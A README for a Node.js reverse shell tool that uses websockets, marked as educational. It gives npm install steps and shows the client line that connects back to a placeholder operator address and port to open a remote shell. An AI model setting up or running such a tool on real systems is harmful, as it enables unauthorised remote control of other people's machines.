
# Reverse shell using websocket (node)

NodeJS reverse shell script using websocket npm to interact between client & server. Educational purpose only.

## Installation

Use the package manager [npm](https://nodejs.org/en/download/) to install some packages.

```bash
npm install websocket
npm install child_process
npm install http
npm install readline-sync
```

## Usage

edit the last line of client.js by adding your ip adress or using localhost if both of them are on the same network.
```javascript
client.connect('ws://IP-OR-DOMAIN:PORT', 'echo-protocol');
```
editing server.js for the connection port at port variable line :
```javascript
let port = 8080;
```

## Contributing
Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.

Please make sure to update tests as appropriate.

## License
[MIT](https://choosealicense.com/licenses/mit/)
